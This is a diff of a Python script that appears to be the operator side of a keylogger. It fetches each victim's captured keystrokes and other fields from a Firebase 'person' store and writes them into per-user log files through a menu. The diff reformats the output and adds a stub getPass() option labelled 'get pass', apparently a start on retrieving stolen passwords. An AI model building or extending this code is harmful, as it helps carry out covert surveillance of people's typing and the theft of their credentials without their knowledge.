@@ -6,39 +6,45 @@ result = firebase.get('person', None)
 
 
 def getAll():
-	print('\n')
+	
 	for x in result:
-		f = result[x]['user']+"_Log.txt"
+		f = result[x]['user'] + "_Log.txt"
 		file = open(f, "w", encoding="utf-8")
 		for i in result[x]:
-			file.write(i+":\n")
+			
 			if i=="keystroke":
+				file.write(i+":\n")
 				keys = result[x][i].split("~")
 				for j in keys:
 					file.write(j + "\n")
 			else:
-				file.write(result[x][i]+"\n")
+				aList = result[x][i].split('~')
+				temp = []
+				for j in  aList:
+					if j != '':
+						temp.append(j)
+				aList = temp
+				file.write(i +':\n' +str(aList) +"\n")
 		file.write("\n")
 	file.close()
 	print('Done\n')
 
 def refresh():
-	print('\n')
 	result = firebase.get('person', None)
 	print('Refresh Done\n')
 
 def getUser():
 	refresh()
-	print('\n')
+	
 	for x in result:
 		name = result[x]['user']
 		print(name)
-	print('\ndone\n')
+	print('done')
 	
 
 def getByName():
 	refresh()
-	print('\n')
+	
 	i=0
 	for x in result:
 		name = result[x]['user']
@@ -64,22 +70,24 @@ def getByName():
 			file.write("\n")
 		i += 1
 	print('Done\n')
-	
+
+def getPass():
+	pass
 
 if __name__=='__main__':
 	while True:
-		try:
-			i = int(input("0 to get log from all user \n1 to get name of all users \n2 to choose a user for a log file \n3 to stop\nEnter: "))
-			if i == 0:
-				getAll()
-			if i == 1:
-				getUser()
-			if i == 2:
-				getByName()
-			if i==3:
-				break
-			if i != 0 and i !=1 and i!=2 and i!=3:
-				print('wrong')
-		except:
-			continue
-		
+	
+		i = input("0 to get log from all user \n1 to get name of all users \n2 to choose a user for a log file \n3 to get pass\n4 to stop\nEnter: ")
+		if i == '0':
+			getAll()
+		if i == '1':
+			getUser()
+		if i == '2':
+			getByName()
+		if i == '3':
+			getPass()
+		if i=='4':
+			break
+		if "01234".find(i) == -1:
+			print('wrong')
+
